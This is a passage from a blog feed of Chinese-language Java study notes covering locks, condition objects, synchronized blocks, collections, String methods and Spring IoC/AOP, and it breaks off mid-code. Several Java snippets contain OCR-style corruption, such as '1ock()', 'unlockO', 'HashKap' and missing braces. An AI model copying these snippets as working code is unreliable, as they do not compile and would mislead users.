否则，如果 Throwable 是 ThreadDeath 的一个实例， 什么都不做。 4 ) 否则，线程的名字以及 Throwable 的栈轨迹被输出到 System.err 上。 这是你在程序中肯定看到过许多次的栈轨迹。</p><h3 id="14-5同步"><a href="#14-5同步" class="headerlink" title="14.5同步"></a>14.5同步</h3><p>有两种机制防止代码块受并发访问的干扰：</p><ol><li><p>synchronized 关键字自动提供一个 锁以及相关的“ 条件”， 对于大多数需要显式锁的情况， 这是很便利的。</p></li><li><p>锁对象 Lock</p><p>锁是可重入的， 因为线程可以重复地获得已经持有的锁。锁保持一个持有计数（ hold count) 来跟踪对 lock 方法的嵌套调用。线程在每一次调用 lock 都要调用 unlock 来释放锁。 由于这一特性， 被一个锁保护的代码可以调用另一个使用相同的锁的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">•<span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">获取这个锁；如果锁同时被另一个线程拥有则发生阻塞。</span></span><br><span class="line"><span class="function">• <span class="keyword">void</span> <span class="title">unlock</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">释放这个锁。</span></span><br><span class="line"><span class="function">•</span></span><br><span class="line"><span class="function"><span class="title">ReentrantLock</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">构建一个可以被用来保护临界区的可重入锁。</span></span><br><span class="line"><span class="function">•</span></span><br><span class="line"><span class="function"><span class="title">ReentrantLock</span><span class="params">(boo1 ean fair)</span></span></span><br><span class="line"><span class="function">构建一个带有公平策略的锁。一个公平锁偏爱等待时间最长的线程。但是，这一公平</span></span><br><span class="line"><span class="function">的保证将大大降低性能。所以， 默认情况下， 锁没有被强制为公平的。</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="14-5-4条件对象"><a href="#14-5-4条件对象" class="headerlink" title="14.5.4条件对象"></a>14.5.4条件对象</h4><p>线程进人临界区，却发现在某一条件满足之后它才能执行。要使用一个条件对 象来管理那些已经获得了一个锁但是却不能做有用工作的线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transfer</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to, <span class="keyword">int</span> amount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bankLock.1ock();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (accounts[from] &lt; amount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// wait</span></span><br><span class="line"><span class="comment">// transfer funds</span></span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">bankLock.unlockO；</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个锁对象可以有一个或多个相关的条件对象。你可以用 newCondition 方法获得一个条 件对象。习惯上给每一个条件对象命名为可以反映它所表达的条件的名字.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> Condition sufficientFunds;</span><br><span class="line"><span class="keyword">public</span> BankO</span><br><span class="line">&#123;</span><br><span class="line">sufficientFunds = bankLock.newConditionO;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">如果 transfer 方法发现余额不足，它调用</span><br><span class="line">sufficientFunds.await();</span><br><span class="line">当前线程现在被阻塞了，并放弃了锁。我们希望这样可以使得另一个线程可以进行增加</span><br><span class="line">账户余额的操作。</span><br></pre></td></tr></table></figure><p>它处于阻塞 状态，直到另一个线程调用同一条件上的 signalAll 方法时为止</p><p>signalAll 方法仅仅是 通知正在等待的线程：此时有可能已经满足条件， 值得再次去检测该条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通常， 对 await 的调用应该在如下形式的循环体中</span><br><span class="line"><span class="keyword">while</span> ( I (ok to proceed) )</span><br><span class="line">condition.awaitQ</span><br></pre></td></tr></table></figure><p><strong>死锁现象</strong></p><p>当一个线程调用 await 时，它 没有办法重新激活自身。它寄希望于其他线程。如果没有其他线程来重新激活等待的线程， 它就永远不再运行了。</p><p>如果所有其他线程被阻 塞， 最后一个活动线程在解除其他线程的阻塞状态之前就调用 await 方法， 那么它也被阻塞。 没有任何线程可以解除其他线程的阻塞，那么该程序就挂起了</p><p><strong>调用SignAll的时机：</strong></p><p>在对象的状态有利于等待线程的方向改变时调用 signalAll。例如， 当一个账户余额发生改变时，等待的线程会应该有机会检查余额。</p><p>注意调用 signalAll 不会立即激活一个等待线程。它仅仅解除等待线程的阻塞， 以便这些 线程可以在当前线程退出同步方法之后，通过竞争实现对对象的访问。</p><p><strong>signl</strong></p><p>是随机解除等待集中某个线程的阻塞状态</p><p>如果随机选择的线程发现自己仍然不能运行， 那么它再次被 阻塞。如果没有其他线程再次调用 signal, 那么系统就死锁了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.locks.Lock <span class="number">5.0</span></span><br><span class="line"></span><br><span class="line">•<span class="function">Condition <span class="title">newCondition</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">返回一个与该锁相关的条件对象。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">java.util.concurrent.locks.Condition 5.0</span></span><br><span class="line"><span class="function">• <span class="keyword">void</span> <span class="title">await</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">将该线程放到条件的等待集中。</span></span><br><span class="line"><span class="function">•<span class="keyword">void</span> <span class="title">signalA11</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">解除该条件的等待集中的所有线程的阻塞状态。</span></span><br><span class="line"><span class="function">• <span class="keyword">void</span> <span class="title">signal</span> <span class="params">( )</span></span></span><br><span class="line"><span class="function">从该条件的等待集中随机地选择一个线程， 解除其阻塞状态。</span></span><br></pre></td></tr></table></figure><h4 id="14-5-5-synchronized关键词"><a href="#14-5-5-synchronized关键词" class="headerlink" title="14.5.5 synchronized关键词"></a>14.5.5 synchronized关键词</h4><p><strong>锁的作用</strong></p><ul><li>锁用来保护代码片段， 任何时刻只能有一个线程执行被保护的代码。</li><li>锁可以管理试图进入被保护代码段的线程。 </li><li>锁可以拥有一个或多个相关的条件对象。 </li><li>每个条件对象管理那些已经进入被保护的代码段但还不能运行的线程。</li></ul><p>如果一个方法用 synchronized关键字声明，那么对象的锁 将保护整个方法。也就是说，要调用该方法，线程必须获得内部的对象锁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> methodO</span><br><span class="line">&#123;</span><br><span class="line">method body</span><br><span class="line">&#125;</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> methodQ</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.intrinsidock.1ock();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">method body</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123; <span class="keyword">this</span>.intrinsicLock.unlockO; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wait、notifyAll 以及 notify 方法是 Object 类的 final 方法。Condition 方法必须被命 名为 await、signalAll 和 signal 以便它们不会与那些方法发生冲突。</p><p>你 必须了解每一个对象有一个内部锁， 并且该锁有一个内部条件。由锁来管理那些试图进入 synchronized 方法的线程，由条件来管理那些调用 wait 的线程。</p><p>将静态方法声明为 synchronized 也是合法的。如果调用这种方法，该方法获得相关的类对 象的内部锁。例如，如果 Bank 类有一个静态同步的方法，那么当该方法被调用时，Bankxlass 对象的锁被锁住。</p><h4 id="14-5-6同步阻塞"><a href="#14-5-6同步阻塞" class="headerlink" title="14.5.6同步阻塞"></a>14.5.6同步阻塞</h4><p>每一个 Java 对象有一个锁。线程可以通过调用同步方法获得锁。还有 另一种机制可以获得锁，通过进入一个同步阻塞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (obj) <span class="comment">// this is the syntax for a synchronized block</span></span><br><span class="line">&#123;</span><br><span class="line">critical section</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="14-5-7监视器"><a href="#14-5-7监视器" class="headerlink" title="14.5.7监视器"></a>14.5.7监视器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">•监视器是只包含私有域的类。</span><br><span class="line">•每个监视器类的对象有一个相关的锁。</span><br><span class="line">•使用该锁对所有的方法进行加锁。换句话说，如果客户端调用 obj.meth0d(), 那 么 obj</span><br><span class="line">对象的锁是在方法调用开始时自动获得， 并且当方法返回时自动释放该锁。因为所有</span><br><span class="line">的域是私有的，这样的安排可以确保一个线程在对对象操作时， 没有其他线程能访问</span><br><span class="line">该域。</span><br><span class="line">•该锁可以有任意多个相关条件。</span><br></pre></td></tr></table></figure><h4 id="14-5-8-Volatile域"><a href="#14-5-8-Volatile域" class="headerlink" title="14.5.8 Volatile域"></a>14.5.8 Volatile域</h4><p>volatile 关键字为实例域的同步访问提供了一种免锁机制。如果声明一个域为 volatile , 那么编译器和虚拟机就知道该域是可能被另一个线程并发更新的。</p><h4 id="14-5-9final变量"><a href="#14-5-9final变量" class="headerlink" title="14.5.9final变量"></a>14.5.9final变量</h4><p>除非使用锁或 volatile 修饰符，否则无法从多个线程安全地读取一 个域。 还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map&lt;String, Double〉accounts = <span class="keyword">new</span> HashKap&lt;&gt;<span class="number">0</span>；</span><br></pre></td></tr></table></figure><p>p680</p><p>易混淆知识点</p><blockquote><ol><li><p>List 是一个有序集合，可以存放重复的数据 (有序：存进是什么顺序，取出时还是什么顺序)</p><pre><code>    (1).ArrayList 底层是数组适合查询，不适合增删元素。    (2).LiskedList 底层是双向链表适合增删元素，不适合查询操作。    (3).Vector 底层和ArrayList相同，但是Vector是线程安全的，效率较低很少使用</code></pre></li><li><p>Set 是一个无序集合，不允许放重复的数据 (无序不可重复，存进和取出的顺序不一样)</p><pre><code>    (1).HashSet 底层是哈希表/散列表    (2).TreeSet 继承sartedSet接口（无需不可重复，但存进去的元素可以按照元素的大小自动排序）</code></pre></li><li><p>Map 是一个无序集合，以键值对的方式存放数据，键对象不允许重复，值对象可以重复。</p></li></ol><p>​        (1).HashMap实现不同步，线程不安全。 HashTable线程安全</p><p>​        (2).HashMap中的key-value都是存储在Entry中的。</p><p>​        (3).HashMap可以存null键和null值，不保证元素的顺序恒久不变，它的底层使用的是数组和链表，通过hashCode()方法和equals方法保证键的唯一性</p></blockquote><p>数据类型使用</p><p>HashSet</p><blockquote><p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。</p><p>HashSet 允许有 null 值。</p><p>HashSet 是无序的，即不会记录插入的顺序。</p><p>HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。</p><p>HashSet 实现了 Set 接口。</p></blockquote><ol><li>add()  添加元素</li><li>contains()  判断元素是否存在</li><li>remove   删除元素</li><li>clear   清除所有元素</li><li>size   计算元素数量</li><li>foreash来进行迭代元素</li><li></li></ol><p>String</p><ol><li><p>length()  获取长度</p></li><li><p>charAt(int index) 获取某个位置的字符</p></li><li><p>indexOf(char  ch)   返回某个字符第一次出现的位置</p><p>indexOf(char  ch,int  fromIndex)   从某个位置开始查询</p><p>LastIndexOf(char  index)    从最后查询某个字符出现的位置</p></li><li><p>boolean contains(str)   是否有字串</p></li><li><p>boolean  isEmpty()   判断长度是否为0</p></li><li><p>boolean  startWith(str)  是否以指定内容开头</p></li><li><p>boolean  endsWith(str)   是否以指定内容结尾</p></li><li><p>boolean  equals(str)    判断字符串内容是否相同</p></li><li><p>char[]  toCharArray()   将字符串转为字符数组</p></li><li><p>valueOf(int)  将基本类型转为字符串</p></li><li><p>String  replace(oldchar,newchar)</p></li><li><p>String split(regex)</p></li><li><p>String substring(begin)</p></li><li><p>String substring(begin,end)</p></li><li><p>toUpperCase()  大写</p></li><li><p>toLowerCase()  小写</p></li><li><p>trim()  去除多个空格</p></li><li><p>compareTo(String)  对两个字符串进行自然顺序的比较</p></li></ol><p>ArrayList</p><ol><li><p>add(Object e) 向ArrayList集合中添加元素</p></li><li><p>size()   返回ArrayList集合中元素个数</p></li><li><p>get(int index)  返回集合中对应位置的元素</p></li><li><p>add(int index,Object e) 向指定位置添加元素</p></li><li><p>set(int i ,Object e) 将索引i位置替换为e并返回替代的元素</p></li><li><p>clear() 清空集合中的元素</p></li><li><p>isEmpty() 判断集合容器是否为空</p></li><li><p>iterator()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">Iterator&lt;String&gt; iterator=list.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">    System.out.println(iterator.next());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>contains(Object o) 判断集合中是否含有指定元素</p></li><li><p>remove(int index)  移除列表中指定位置的元素，并返回</p></li><li><p>remove(Object o) 移除指定元素</p></li></ol><p>HashMap</p><ol><li>put(key,value)  将映射存到Map集合中</li><li>get(Object o)  返回指定键所映射的值，没有key对应的值则返回null,即获取Key对应的value</li><li>size()   返回Map集合中数据数量</li><li>clear()  清空Map集合</li><li>isEmpty()  判断集合中是否有数据</li><li>remove(Object key) 移除</li><li>values()  返回Map集合中所有value组成的Collection数据类型</li><li>keySet()  返回Map集合中所有key组成的Set集合</li><li>entrySet()  将Map集合每个key-value转换为一个Entry对象并返回由所有的Entry对象组成的Set集合</li><li>iterator迭代器<ol><li>与get方法结合</li><li>与entry对象结合</li></ol></li></ol><p>如何选择集合类型</p><blockquote><p>是否是键值对象形式:<br>是：Map<br>键是否需要排序:<br>是：TreeMap<br>否：HashMap<br>不知道，就使用HashMap。<br>　　 否：Collection<br>元素是否唯一:<br>是：Set<br>元素是否需要排序:<br>是：TreeSet<br>否：HashSet<br>不知道，就使用HashSet　<br>否：List<br>要安全吗:<br>是：Vector(其实我们也不用它,后面我们讲解了多线程以后，我在给你回顾用谁)<br>否：ArrayList或者LinkedList<br>增删多：LinkedList<br>查询多：ArrayList<br>不知道，就使用ArrayList</p></blockquote><p>类型相互转换</p><ol><li><p>char 转换为 String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String s = String.valueOf(<span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>String 转换为 char</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回指定位置的字符</span></span><br><span class="line">String.charAt(index)</span><br><span class="line"><span class="comment">//包含整个String的字符数组</span></span><br><span class="line">String.toCharArray()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java基础&quot;&gt;&lt;a href=&quot;#Java基础&quot; class=&quot;headerlink&quot; title=&quot;Java基础&quot;&gt;&lt;/a&gt;Java基础&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;声明：本笔记资料来源于JAVA核心卷1基础知识原书第10版&lt;/p&gt;
&lt;/block</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="Java基础" scheme="https://a2914475618.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Spring mvc</title>
    <link href="https://a2914475618.github.io/2021/09/20/Spring-mvc/"/>
    <id>https://a2914475618.github.io/2021/09/20/Spring-mvc/</id>
    <published>2021-09-20T08:21:15.000Z</published>
    <updated>2021-10-07T05:14:27.139Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="spring mvc" scheme="https://a2914475618.github.io/tags/spring-mvc/"/>
    
  </entry>
  
  <entry>
    <title>Spring</title>
    <link href="https://a2914475618.github.io/2021/09/18/spring/"/>
    <id>https://a2914475618.github.io/2021/09/18/spring/</id>
    <published>2021-09-18T00:53:50.000Z</published>
    <updated>2021-10-18T10:13:37.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><blockquote><p>Ioc(反转控制)  和  Aop</p><p>方便解耦</p></blockquote><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lusir.springtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/18 - 19:24</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ApplicationContext ctx=<span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        User user=ctx.getBean(<span class="string">&quot;user&quot;</span>,User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">        user.go();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lusir.springtest.User&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="IOC概念"><a href="#IOC概念" class="headerlink" title="IOC概念"></a>IOC概念</h2><blockquote><p>对象创建和对象之间的调用过程，交给spring管理</p></blockquote><h3 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h3><blockquote><p>核心：</p><ol><li>xml解析</li><li>工厂模式<ul><li>利用第三个类来创建对象</li></ul></li><li>反射</li></ol></blockquote><p>Ioc解耦过程</p><blockquote><ol><li>用xml配置文件，配置创建的对象</li><li>创建工厂类，在类中</li><li>通过反射创建对象</li></ol></blockquote><p>Ioc接口</p><blockquote><ol><li><p>Ioc思想基于IOC完成，Ioc容器底层就是对象工厂</p></li><li><p>spring提供IOC容器实现两种方式</p><ul><li>BeanFactory:IOC容器基本实现，是Spring内部使用的接口，不提供给开发人员使用——加载配置文件的时候不会创建对象，在获取对象时 才会取创建对象</li><li>ApplicationContext：是BeanFactory接口的子接口，提供更多强大的功能，一般由开发人员使用——在加载配置文件的时候就会把文件对象进行创建</li></ul></li></ol></blockquote><p>Ioc操作Bean管理</p><blockquote><ol><li>Bean管理指的是两个操作</li><li>Spring创建对象</li><li>spring注入属性</li></ol></blockquote><blockquote><p>实现方式两种</p><p>1.xml配置文件方式</p><p>2.注解方式</p></blockquote><p>xml创建对象默认执行无参数构造方法</p><blockquote><p>注入属性</p><ol><li><p>set</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name指的属性的名字  value指的属性的值  ref是引用对象</span><br></pre></td></tr></table></figure><p>也可以使用P命名空间</p></li><li><p>构造参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">//name 参数名   </span><br></pre></td></tr></table></figure></li></ol><p>注入的三种数据类型</p><ol><li><p>普通数据类型  value</p></li><li><p>引用数据类型  ref</p></li><li><p>集合数据类型   list  map  props set ref引用</p><p>ref标签在集合中注入对象属性</p><p>提取list集合属性注入  引入util</p></li></ol><p>注入空值字面量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;reason&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">null</span>&gt;</span><span class="tag">&lt;/<span class="name">null</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>属性值包含特殊值符号  写在CDate里</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;adress&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[&lt;&lt;南京&gt;&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入其他配置文件</p><ul><li><p>可以根据层来拆xml   可以根据业务来拆xml</p></li><li><p>在主文件引入其他模块</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resourve</span>=<span class="string">&quot;xxxxx.xml&quot;</span>  /<span class="attr">import</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="Aop概念"><a href="#Aop概念" class="headerlink" title="Aop概念"></a>Aop概念</h2><blockquote><p>面向切面编程   将各个部分隔离</p><p>不通过修改源代码的方式，在主干里添加功能</p></blockquote><h3 id="底层原理-1"><a href="#底层原理-1" class="headerlink" title="底层原理"></a>底层原理</h3><blockquote><p>使用动态代理</p></blockquote><blockquote><p>两种情况下</p><ol><li><p>有接口，jdk动态代理</p><p>创建接口实现类的代理对象  增强类的方法</p></li><li><p>没有接口，CGLIB动态代理</p><p>创建当前类子类的代理对象  来增强类的方法</p></li></ol></blockquote><h3 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h3><blockquote><p>proxy类   </p><p>newProxyInstance方法   </p><p>方法参数</p><ol><li><p>类加载器</p></li><li><p>增强方法所在的类，这个类实现的接口，支持多个接口</p></li><li><p>实现InvocationHandler接口，创建代理对象，写增强的方法</p></li><li><p>```java<br>Proxy.newProxyInstance(类加载器，代理对象的类，实现InnocationHandler接口的类)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line">               </span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">               </span><br><span class="line">import java.util.Arrays;</span><br><span class="line">               </span><br><span class="line">&#x2F;**</span><br><span class="line"> * @author lusir</span><br><span class="line"> * @date 